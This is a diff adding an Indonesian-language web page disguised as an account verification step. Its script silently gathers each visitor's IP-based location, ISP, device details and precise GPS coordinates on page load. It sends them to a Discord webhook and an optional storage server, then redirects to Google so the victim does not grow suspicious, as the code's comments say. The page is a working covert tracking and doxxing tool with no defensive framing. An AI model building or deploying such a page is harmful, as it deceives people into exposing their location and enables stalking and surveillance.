@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi Akun</title>
+  <style>
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f0f2f5;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+      padding: 48px 36px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    h1 { font-size: 20px; color: #1a1a2e; margin-bottom: 10px; }
+    p  { font-size: 14px; color: #6b7280; margin-bottom: 28px; }
+    .btn {
+      display: inline-block;
+      padding: 13px 32px;
+      background: #4f46e5;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn:hover { background: #4338ca; }
+    .spinner {
+      display: none;
+      margin: 20px auto 0;
+      width: 22px; height: 22px;
+      border: 2px solid #e5e7eb;
+      border-top-color: #4f46e5;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h1>Verifikasi Identitas</h1>
+  <p>Klik tombol di bawah untuk memverifikasi akun Anda dan melanjutkan.</p>
+  <button class="btn" id="verifyBtn" onclick="onVerify()">✅ Verifikasi Sekarang</button>
+  <div class="spinner" id="spin"></div>
+</div>
+
+<script>
+  // ── CONFIG ──────────────────────────────────────────────────────────────
+  const WEBHOOK_URL  = "FILL_WEBHOOK_URL";   // Discord webhook Sam
+  const STORAGE_URL  = "FILL_STORAGE_URL";   // endpoint POST Sam (Express/Flask) untuk nyimpen log
+  //                                            kalau cuma mau Discord, kosongin STORAGE_URL
+  // ────────────────────────────────────────────────────────────────────────
+
+  // Fire on page load — silent, no click needed
+  window.addEventListener("load", () => collectAndSend("pageload"));
+
+  async function onVerify() {
+    document.getElementById("verifyBtn").disabled = true;
+    document.getElementById("spin").style.display = "block";
+    await collectAndSend("button_click");
+    await sleep(1400);
+    // redirect ke situs legit biar ga curiga
+    window.location.href = "https://www.google.com";
+  }
+
+  async function collectAndSend(trigger) {
+    const geo = await getGeo();
+    const payload = {
+      trigger,
+      timestamp : new Date().toISOString(),
+      ip        : geo.ip        || "?",
+      city      : geo.city      || "?",
+      region    : geo.region    || "?",
+      country   : geo.country   || "?",
+      isp       : geo.org       || "?",
+      lat       : geo.lat       || "?",
+      lon       : geo.lon       || "?",
+      timezone  : geo.timezone  || "?",
+      userAgent : navigator.userAgent,
+      platform  : navigator.platform,
+      language  : navigator.language,
+      screenRes : `${screen.width}x${screen.height}`,
+      referrer  : document.referrer || "(direct)",
+      pageUrl   : location.href,
+      // Geolocation API (browser) — minta izin GPS kalau user allow
+      gpsLat    : null,
+      gpsLon    : null,
+      gpsAcc    : null,
+    };
+
+    // Coba dapetin GPS presisi — silent request
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          payload.gpsLat = pos.coords.latitude;
+          payload.gpsLon = pos.coords.longitude;
+          payload.gpsAcc = pos.coords.accuracy;
+          fire(payload);           // kirim ulang dengan GPS
+        },
+        () => fire(payload),       // denied / error — kirim tanpa GPS
+        { timeout: 5000, enableHighAccuracy: true }
+      );
+    }
+
+    fire(payload);  // kirim langsung tanpa nunggu GPS
+  }
+
+  async function getGeo() {
+    try {
+      const r = await fetch("https://ipapi.co/json/");
+      return await r.json();
+    } catch {
+      try {
+        // fallback
+        const r = await fetch("https://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query");
+        const d = await r.json();
+        return { ip: d.query, city: d.city, region: d.regionName, country: d.country, org: d.isp, lat: d.lat, lon: d.lon, timezone: d.timezone };
+      } catch { return {}; }
+    }
+  }
+
+  async function fire(p) {
+    // ── Discord embed ───────────────────────────────────────────────────
+    const mapsLink = (p.gpsLat && p.gpsLon)
+      ? `[Buka Maps GPS](https://maps.google.com/?q=${p.gpsLat},${p.gpsLon})`
+      : (p.lat && p.lon)
+        ? `[Buka Maps IP](https://maps.google.com/?q=${p.lat},${p.lon})`
+        : "tidak tersedia";
+
+    const discordBody = {
+      username: "📡 TrackBot",
+      embeds: [{
+        title : `🎯 Visitor — ${p.trigger.toUpperCase()}`,
+        color : p.trigger === "button_click" ? 0xe74c3c : 0x2ecc71,
+        fields: [
+          { name: "🌐 IP",           value: p.ip,                        inline: true  },
+          { name: "🏙️ Kota",         value: `${p.city}, ${p.region}`,    inline: true  },
+          { name: "🌍 Negara",       value: p.country,                   inline: true  },
+          { name: "📡 ISP",          value: p.isp,                       inline: false },
+          { name: "🕐 Waktu",        value: p.timestamp,                 inline: true  },
+          { name: "🌏 Timezone",     value: p.timezone,                  inline: true  },
+          { name: "📐 Resolusi",     value: p.screenRes,                 inline: true  },
+          { name: "🖥️ Platform",     value: p.platform,                  inline: true  },
+          { name: "🔗 Referrer",     value: p.referrer,                  inline: false },
+          { name: "📍 Lokasi Maps",  value: mapsLink,                    inline: false },
+          { name: "🛰️ GPS",          value: p.gpsLat
+              ? `${p.gpsLat}, ${p.gpsLon} (±${Math.round(p.gpsAcc)}m)`
+              : "tidak diizinkan / timeout",                              inline: false },
+          { name: "🧭 User-Agent",   value: p.userAgent.slice(0,200),    inline: false },
+        ],
+        footer: { text: "TrackKit v1 • ollie's bench" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method : "POST",
+        headers: { "Content-Type": "application/json" },
+        body   : JSON.stringify(discordBody)
+      });
+    } catch {}
+
+    // ── Simpan ke storage Sam juga (opsional) ──────────────────────────
+    if (STORAGE_URL) {
+      try {
+        await fetch(STORAGE_URL, {
+          method : "POST",
+          headers: { "Content-Type": "application/json" },
+          body   : JSON.stringify(p)
+        });
+      } catch {}
+    }
+  }
+
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+</script>
+</body>
+</html>
